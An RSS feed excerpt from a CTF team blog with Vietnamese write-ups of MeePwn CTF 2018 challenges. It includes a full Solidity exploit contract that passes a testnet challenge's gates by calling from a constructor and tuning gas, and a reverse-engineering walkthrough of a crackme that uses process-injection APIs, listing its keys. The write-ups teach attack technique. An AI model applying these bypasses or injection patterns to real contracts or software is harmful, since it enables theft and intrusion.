<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	
xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
>

<channel>
	<title>BabyPhD CTF Team</title>
	<atom:link href="https://babyphd.net/feed/" rel="self" type="application/rss+xml" />
	<link>https://babyphd.net</link>
	<description>Nói chung đây là một khái niệm vô cùng trừu tượng</description>
	<lastBuildDate>Thu, 16 Aug 2018 21:09:22 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.2.2</generator>
<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
		<title>MEEPWN CTF 2018 - meepwn contract</title>
		<link>https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/</link>
				<pubDate>Wed, 01 Aug 2018 12:47:31 +0000</pubDate>
		<dc:creator><![CDATA[vigov5]]></dc:creator>
				<category><![CDATA[misc]]></category>
		<category><![CDATA[smartcontract]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=771</guid>
				<description><![CDATA[https://scoreboard.meepwn.team/task Source code của "gate": pragma solidity ^0.4.18; contract Meepwn_Wire { address public entrant; constructor() { entrant = msg.sender; } function isAccountAddress(address addr) private returns(bool) { uint x; assembly { x := extcodesize(caller) } return x == 0; } function exploitMe(bytes8 _key) { require(msg.sender != tx.origin); require(isAccountAddress(msg.sender)); require(msg.gas % 1337 == 0); require(uint64(_key) ^ uint64(sha3(msg.sender)) &#8230; <a href="https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - meepwn contract</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p><a href="https://scoreboard.meepwn.team/task" target="_blank" rel="noopener">https://scoreboard.meepwn.team/task</a></p>
<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/fd265c3f-adf9-428b-8bee-30682193eff2.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/fd265c3f-adf9-428b-8bee-30682193eff2.png" data-recalc-dims="1" /></p>
<p>Source code của "gate":</p>
<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract Meepwn_Wire
<span class="token punctuation">{</span>
    address <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        entrant <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">isAccountAddress</span><span class="token punctuation">(</span>address addr<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token function">returns</span><span class="token punctuation">(</span>bool<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        uint x<span class="token punctuation">;</span>
        assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token keyword">return</span> x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">exploitMe</span><span class="token punctuation">(</span>bytes8 _key<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">isAccountAddress</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>gas <span class="token operator">%</span> <span class="token number">1337</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span>_key<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><span id="more-771"></span></p>
<p>Interface của contract chính:</p>
<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract MeePwnMain <span class="token punctuation">{</span>

  <span class="token keyword">function</span> <span class="token function">getNewInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token function">returns</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token keyword">function</span> <span class="token function">submitInstance</span><span class="token punctuation">(</span>string email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span><span class="token punctuation">(</span>bytes32<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>sau khi truy cập đến <a href="http://178.128.87.12/smart-contract" target="_blank" rel="noopener">http://178.128.87.12/smart-contract</a> những việc bạn cần làm như sau (hiện site đã không truy cập được nữa, mình xin phép tóm tắt lại theo...kí ức của mình <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="😄" class="wp-smiley" style="height: 1em; max-height: 1em;" />)</p>
<ul>
<li>Sẽ có một contract chính tại địa chỉ <a href="https://ropsten.etherscan.io/address/0x3da169ad88c8f419b57e181fe971b33993dfdc81" target="_blank" rel="noopener">0x3da169ad88c8f419b57e181fe971b33993dfdc81</a> được deploy trên Testnet Ropsten</li>
<li>Bạn sẽ gọi hàm <code>getNewInstance</code> chuyển 0.1 ETH vào địa chỉ này, contract chính sẽ deploy contract <strong>Meepwn_Wire</strong> ở trên và gán <code>entrant = msg.sender</code> tức là địa chỉ của contract chính.</li>
<li>Nhiệm vụ của bạn làm thế nào đó, dùng hàm <code>exploitMe</code>, vượt qua tất cả các "gate", set lại biến <code>entrant</code> thành địa chỉ của mình (pwned !)</li>
<li>Sau đó gọi hàm <code>submitInstance</code> kèm với email của mình để chứng minh mình đã làm được, để hệ thống gửi flag về email mà bạn submit.</li>
</ul>
<p>Về cơ bản, mô hình này khá giống với <a href="https://ethernaut.zeppelin.solutions/" target="_blank" rel="noopener">Ethernaut</a> cụ thể hơn thì bạn có thể tham khảo thêm các bài write-up của anh <a href="https://viblo.asia/u/kiendinang" target="_blank" rel="noopener">@kiendinang</a> trên Viblo, với nhiều cấp độ từ dễ đến khó.</p>
<h1 id="_walk-through-1">Walk Through</h1>
<p>Mình xin tóm tắt các bước để vượt qua các gate như sau:</p>
<h2 id="_gate-1-2">Gate 1</h2>
<p><code>require(msg.sender != tx.origin);</code> : Trong Solidity thì <code>msg.sender</code> là thứ/người trực tiếp gọi hàm của contract, còn <code>tx.origin</code> là người tạo ra transaction. Do vậy <code>tx.origin</code> sẽ luôn là người dùng, còn <code>msg.sender</code> thì có thể là người dùng hoặc là một contract khác. Do vậy ta có mô hình sau:</p>
<pre class="language-none"><code class="language-none">A (người dùng) -&gt; B (exploit contract) -&gt; C (Meepwn_Wire contract)
</code></pre>
<p>Với mô hình này sẽ đảm bảo được <code>msg.sender != tx.origin</code></p>
<h2 id="_gate-2-3">Gate 2</h2>
<p><code>require(isAccountAddress(msg.sender));</code> : Gate này đúng như tên hàm, kiểm tra xem địa chỉ đang tương tác với contract, có phải là người dùng không hay là một contract khác ? và <strong>Meepwn_Wire</strong> yêu cầu <code>msg.sender</code> phải là một account người dùng thông qua việc kiểm tra storage của account có chứa code hay không bằng đoạn assembly (nếu địa chỉ là người dùng thì sẽ codesize == 0, và ngược lại nếu đó là một contract khác)</p>
<pre class="language-js"><code class="language-js">assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
</code></pre>
<p>Nếu vậy, trick chúng ta dùng ở bước 1 sẽ fail ? Tuy nhiên, có một thời điểm mà codesize của một contract bằng 0, đó chính là thời điểm mà contract được deploy (nói cách khác, khi đang chạy contructor của contract), như được note trong <a href="https://github.com/ethereum/yellowpaper" target="_blank" rel="noopener">yellow paper</a> của Ethereum. Vậy để pass qua gate này, ta cần thực hiện exploit trong contructor của contract. Đến đây ta có thể xây dựng được contract tạm thời dùng để exploit như sau:</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">exploitMe</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>với target là địa chỉ của contract <code>Meepwn_Wire</code> mà contract chính đã deploy. Để biết được địa chỉ này, bạn có thể tìm đến transaction <code>getNewInstance</code> trên <a href="https://ropsten.etherscan.io/" target="_blank" rel="noopener">https://ropsten.etherscan.io/</a> và kiểm tra tab <code>Internal Transactions</code>.</p>
<h2 id="_gate-3-4">Gate 3</h2>
<p><code>require(msg.gas % 1337 == 0);</code> : Gate này yêu cầu số gas còn lại (<code>msg.gas</code>) tại thời điểm thực hiện kiểm tra phải chia hết cho 1337. Để thực hiện điều này, ta có thể gọi hàm <code>exploitMe</code> theo cách sau:</p>
<pre class="language-js"><code class="language-js">t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span>xxx<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span>
</code></pre>
<p>với <code>xxx</code> là số gas dùng để chạy hàm <code>exploitMe</code>. Như vậy chúng ta sẽ control được số gas truyền vào. Vậy truyền vào bao nhiêu gas để thoả mãn ? Mình sẽ làm theo cách thử saim truyền vào 1 số gas tuỳ ý, và kiểm tra instruction trên Remix.</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">98000</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x41414141</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Ví dụ chạy với gas 98000, chắc chắn transaction sẽ fail, bằng sử dụng môi trường Javascript VM trên Remix sẽ cho phép chúng ta debug:<img class="medium-zoom-image" src="https://i2.wp.com/images.viblo.asia/a22a0df6-77f0-4920-b715-634fa749ffda.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/a22a0df6-77f0-4920-b715-634fa749ffda.png" data-recalc-dims="1" /></p>
<p>Click <code>Debug</code>, mở phần <code>Instructions</code> và <code>Stack</code> và step qua từng instruction cho đến đoạn kiểm tra số gas:</p>
<p><img class="medium-zoom-image" src="https://i1.wp.com/images.viblo.asia/bd209629-0feb-4b81-934e-bb8d9d5f8705.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/bd209629-0feb-4b81-934e-bb8d9d5f8705.png" data-recalc-dims="1" /></p>
<p>IP hiện đang ở 363, ngay sau khi chúng ta chạy xong <code>GAS</code>, top stack lúc này sẽ chính là số gas còn lại: <code>0x17abc = 96956</code> (tại ngăn tiếp theo chính là giá trị <code>0x539</code> = 1337). Vậy ta sẽ có gas thoả mãn là:</p>
<pre class="language-none"><code class="language-none">98000 - 96956 % 1337 = 97308
</code></pre>
<p><strong>Note</strong>: Để đảm bảo debug đúng thì version compiler và thiết lập optimize của bạn và đề bài phải giống nhau, rất may, đều đang là version <code>soljson-v0.4.24+commit.e67f0147.js</code> <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="😄" class="wp-smiley" style="height: 1em; max-height: 1em;" />, cơ mà nếu có sai thì cũng sai khác nhau không quá 100 gas, chúng ta có thể brute-force được <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f606.png" alt="😆" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<h2 id="_gate-4-5">Gate 4</h2>
<p><code>require(uint64(_key) ^ uint64(sha3(msg.sender)) ^ uint64(sha3(address(this))) == 0x13371337);</code> : gate này là khá đơn giản (tuy nhiên trong thời gian thi BTC đã không may đeploy nhầm source code đoạn này khiến các đội thi tốn cỡ "1 tiếng" tìm cách brute-force 8 bytes sha3 (nếu thực sự có team định làm vậy <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f605.png" alt="😅" class="wp-smiley" style="height: 1em; max-height: 1em;" />)), đây là phép XOR và chúng ta làm lại như sau:</p>
<pre class="language-js"><code class="language-js">_key <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span>

</code></pre>
<p><code>this</code> ở đây sẽ cho ra địa chỉ contract exploit của chúng ta.</p>
<h2 id="_full-exploit-6">Full Exploit</h2>
<p>(Test thử trên Remix trước cho chắc ăn rồi hãy submit nhé)</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">97308</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Việc còn lại là thực hiện <code>submitInstance</code> và chờ mail flag về:</p>
<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png" data-recalc-dims="1" /></p>
<h1 id="_references-7">References</h1>
<ul>
<li><a href="https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db" target="_blank" rel="noopener">https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db</a></li>
<li><a href="http://solidity.readthedocs.io/en/v0.4.24/" target="_blank" rel="noopener">http://solidity.readthedocs.io/en/v0.4.24/</a></li>
</ul>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">771</post-id>	</item>
		<item>
		<title>MEEPWN CTF 2018 - XSS</title>
		<link>https://babyphd.net/2018/07/17/meepwn-ctf-2018-xss/</link>
				<pubDate>Tue, 17 Jul 2018 16:55:34 +0000</pubDate>
		<dc:creator><![CDATA[yeuchimse]]></dc:creator>
				<category><![CDATA[re]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=751</guid>
				<description><![CDATA[Lúc đầu nhìn tên bài mình cứ nghĩ là dạng binary .Net chứa mấy đề XSS giống ở SECCON, nên còn không buồn đọc đề. Đến lúc làm thì thấy là cũng liên quan thật. File binary khi được chạy sẽ fork thêm 1 process nữa, rồi process mới này lại fork một process khác, &#8230; <a href="https://babyphd.net/2018/07/17/meepwn-ctf-2018-xss/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - XSS</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?ssl=1"><img data-attachment-id="752" data-permalink="https://babyphd.net/2018/07/17/meepwn-ctf-2018-xss/2018-07-17_20-57-55/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?fit=683%2C317&amp;ssl=1" data-orig-size="683,317" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2018-07-17_20-57-55" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?fit=300%2C139&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?fit=604%2C280&amp;ssl=1" class="aligncenter wp-image-752 size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?resize=604%2C280&#038;ssl=1" alt="" width="604" height="280" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?w=683&amp;ssl=1 683w, https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?resize=300%2C139&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a>Lúc đầu nhìn tên bài mình cứ nghĩ là dạng binary .Net chứa mấy đề XSS giống ở SECCON, nên còn không buồn đọc đề. Đến lúc làm thì thấy là cũng liên quan thật.</p>
<p>File binary khi được chạy sẽ fork thêm 1 process nữa, rồi process mới này lại fork một process khác, tổng là 3 process. Mỗi process này sẽ dựa theo số lượng tham số truyền vào để xử lý theo nhánh riêng của nó (process đầu không có tham số, process thứ hai có 1 tham số là <code>1</code>, process thứ ba có 2 tham số là <code>1</code> và <code>2</code>). Mình debug bằng cách attach 3 cửa sổ IDA vào lần lượt 3 process.<span id="more-751"></span></p>
<p>Nếu cứ diễn giải lần lượt từng bước thì khá dài dòng, về cơ bản là các process sẽ tương tác với nhau bằng cách inject code và thực thi thông qua các hàm: <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>ReadProcessMemory</code>, <code>WriteProcessMemory</code>, <code>WaitForSingleObject</code>, <code>ReleaseSemaphore</code>,  và <code>CreateRemoteThread</code>. Các code được inject tương đối giống nhau, có dạng thế này (đây là code đọc input từ người chơi):</p>
<pre>    v11 = 0;
    hObject = 0;
    while ( WaitForSingleObject(*(&amp;dword_4F4FFC + (_DWORD)lpParameter), 1u) == 258 )
        ;
    arr1[0] = 97;
    arr1[1] = 98;
    arr1[2] = 99;
    arr1[3] = 100;
    arr1[4] = 97;
    arr1[5] = 98;
    arr1[6] = 99;
    arr1[7] = 100;
    arr1[8] = 97;
    arr1[9] = 98;
    arr1[10] = 99;
    arr1[11] = 100;
    arr1[12] = 97;
    arr1[13] = 98;
    arr1[14] = 99;
    arr1[15] = 100;
    arr2[0] = 106;
    arr2[1] = 21;
    arr2[2] = 109;
    arr2[3] = 11;
    arr2[4] = -99;
    arr2[5] = -16;
    arr2[6] = -62;
    arr2[7] = 52;
    arr2[8] = 116;
    arr2[9] = -118;
    arr2[10] = -44;
    arr2[11] = 79;
    arr2[12] = 80;
    arr2[13] = -124;
    arr2[14] = -96;
    arr2[15] = 127;
    for ( i = 0; i &lt; 16; ++i )
    {
        v8 = getchar();
        arr1[i] = v8 ^ arr2[i];
    }
    while ( WaitForSingleObject(*(&amp;hHandle + (_DWORD)lpParameter), 1u) == 258 )
        ;
    hProcess = OpenProcess(dwDesiredAccess, 0, *(&amp;BaseAddress + (_DWORD)lpParameter));
    if ( !hProcess )
        exit(0);
    v13 = 0;
    lpBaseAddress = (LPCVOID)BaseAddress;
    Buffer = 0;
    while ( 1 )
    {
        v13 = ReadProcessMemory(hProcess, lpBaseAddress, &amp;Buffer, 1u, 0);
        if ( !v13 )
            exit(0);
        if ( Buffer == 198 )
            break;
        lpBaseAddress = (char *)lpBaseAddress + 1;
    }
    lpBaseAddress = (char *)lpBaseAddress - 1;
    for ( j = 0; j &lt; 16; ++j )
    {
        v13 = WriteProcessMemory(hProcess, (char *)lpBaseAddress + 4, &amp;arr1[j], 1u, 0);
        if ( !v13 )
            exit(0);
        lpBaseAddress = (char *)lpBaseAddress + 4;
    }
    CloseHandle(hProcess);
    hObject = OpenProcess(dwDesiredAccess, 0, dword_4F502C[2]);
    if ( !hObject )
        exit(0);
    dwSize = 43632;
    v10 = VirtualAllocEx(hObject, 0, 0xAA70u, 0x1000u, 0x40u);
    if ( !v10 )
        exit(0);
    v6 = v10;
    lpBuffer = byte_4FFAA8;
    v11 = WriteProcessMemory(hObject, &amp;BaseAddress, &amp;v10, 4u, 0);
    if ( !v11 )
        exit(0);
    for ( k = 0; k &lt; dwSize; ++k )
        byte_4FFAA8[k] ^= 0x66u;
    v11 = WriteProcessMemory(hObject, v6, lpBuffer, dwSize, 0);
    if ( !v11 )
        exit(0);
    lpStartAddress = (LPTHREAD_START_ROUTINE)v10;
    v4 = CreateRemoteThread(hObject, 0, 0, (LPTHREAD_START_ROUTINE)v10, lpParameter, 0, 0);
    if ( !v4 )
        exit(0);
    CloseHandle(hObject);
    return ReleaseSemaphore(*(&amp;hSemaphore + (_DWORD)lpParameter), 1, 0);
}</pre>
<p>Mình sẽ không nói chi tiết về việc binary dùng <code>Semaphore</code> và <code>CreateRemoteThread</code> như thế nào để điều khiển luồng thực thi cho đúng, vì nói thật nó loằng ngoằng và mình cũng không cố note lại. Tuy nhiên, để làm được bài thì vẫn cần biết chương trình làm những gì, nên sau khi F8 tỉ mỉ một vài lượt inject code đầu tiên, nhận thấy có sự tương đồng như đã nói khi nãy, mình đẩy nhanh tiến độ bằng cách đặt breakpoint ở hàm <code>kernel32_CreateRemoteThread</code>(trong cả 3 process) và cứ thế chạy, mỗi khi dừng ở breakpoint, mình dựa vào tham số <code>lpStartAddress</code> để biết địa chỉ phần code chuẩn bị được thực thi ở đâu, rồi mở xem code đó nó làm gì (đáng lẽ cần phải xem tham số <code>hProcess</code> để biết là process nào nữa, nhưng mình lười nên cứ Alt+Tab lần lượt 3 cửa sổ IDA để thử thôi). Cũng có một chút anti-decompile nhưng có thể fix bằng tay được. Nhìn chung chương trình hoạt động như thế này:</p>
<p>Các đoạn code giống nhau về cấu trúc, có sẵn hai mảng 16 ký tự là <code>arr1</code> và <code>arr2</code>, trong đó mảng <code>arr1</code> luôn là <code>abcdabcdabcdabcd</code>. Khi được thực thi bằng hàm <code>CreateRemoteThread</code>, code sẽ xử lý 2 mảng <code>arr1</code> và <code>arr2</code> (bằng một trong các thao tác xor, <a href="https://www.felixcloutier.com/x86/AESENC.html" target="_blank" rel="noopener">aesenc</a>, <a href="https://www.felixcloutier.com/x86/AESENCLAST.html" target="_blank" rel="noopener">aesenclast</a> hoặc so sánh), sau đó, ghi đè output  vào mảng <code>arr1</code> của đoạn code thực thi sau đó thông qua hàm <code>WriteProcessMemory</code> (đoạn code này vốn cũng đã thực thi rồi, nhưng đang bị dừng bởi Semaphore). Bên cạnh việc xử lý input thì mỗi thread cũng kiêm thêm việc ghi code cho các thread sau. Để dễ hình dung (vì nếu nói chính xác thì các đoạn code không chạy một mạch từ đầu đến cuối mà sẽ bị gián đoạn bởi Semaphore), có thể tưởng tượng với đầu vào là input mà ta nhập, chương trình cho nó đi qua một dây chuyền sản xuất, ở mỗi bước giá trị của input lại bị thay đổi một tí, xong được đẩy sang bước tiếp theo. Có tất cả là 1 bước xor, 9 bước <code>aesenc</code>, 1 bước <code>aesenclast</code> (<a href="https://www.cosic.esat.kuleuven.be/ecrypt/AESday/slides/Use_of_the_AES_Instruction_Set.pdf" target="_blank" rel="noopener">AES128</a>) và cuối cùng là 1 bước so sánh (để hiện thông báo <code>Correct!</code> hoặc <code>Try Again!</code>). Chúng ta có toàn bộ hardcoded key được dùng trong các bước này và tất nhiên là cả giá trị so sánh cuối cùng.</p>
<pre>xor_key = '6A156D0B9DF0C234748AD44F5084A07F'

aes_keys = [
'609D4731B5DD367EEF997AD8495C4523',
'FAECDBBB93B23AEF68E4BE6D2FF66B4C',
'3E43953C69D073672297D1B1A361FD4A',
'45337E3CF07F2DAC33443B75482AC546',
'4DF0EC1A3D04A9DBF5D5081A80709306',
'BAF0AB1FAC2F5881F125B159F979DE03',
'34AFFF57513A0FEC8BA0E65F8C986078',
'2EEBCF4605AE3D94BA8CCCF44CA11D4C',
'74F9C5427F7A6EE2B11F2CC21804B8F7',
'0A98631D8469820807CA31F71D335629',
]

target = '68CEDFDD586C37E4C4E1ACB4097F97A4'</pre>
<p>Đến đây thì phần RE đã xong, phần còn lại là Crypto, mình hỏi một chuyên gia mật mã đầu ngành của team và nhận lại flag vài phút sau đó.</p>
<p>P.S: Có một bí ẩn xung quanh challenge này, nhưng bây giờ cảm giác tội lỗi với Linh Ka khiến mình không tập trung làm được việc gì cả. Nếu sau này có thời gian tìm hiểu thêm thì mình sẽ bổ sung vào bài viết sau.</p>
<p>Quên mất, cá nhân mình đánh giá đây là một đề mất không ít thời gian để xây dựng, nên kudos to người ra đề!</p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">751</post-id>	</item>
		<item>
		<title>MEEPWN CTF 2018 - PyCalx2</title>
		<link>https://babyphd.net/2018/07/17/meepwn-ctf-2018-pycalx2/</link>
				<pubDate>Tue, 17 Jul 2018 13:39:52 +0000</pubDate>
		<dc:creator><![CDATA[yeuchimse]]></dc:creator>
				<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=734</guid>
				<description><![CDATA[Bài này code giống hệt bài 1, khác mỗi cái là biến op bây giờ cũng không được chứa các ký tự trong mảng ['(',')','[',']','\'','"'] nữa, do đó không thể dùng kiểu +' để break giá trị của value2 ra ngoài chuỗi. Nói cách khác, value1 và value2 đều sẽ chỉ là các string đơn thuần. Mình search thử thì thấy &#8230; <a href="https://babyphd.net/2018/07/17/meepwn-ctf-2018-pycalx2/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - PyCalx2</span> <span class="meta-nav">&#8594;</span></a>]]></description>
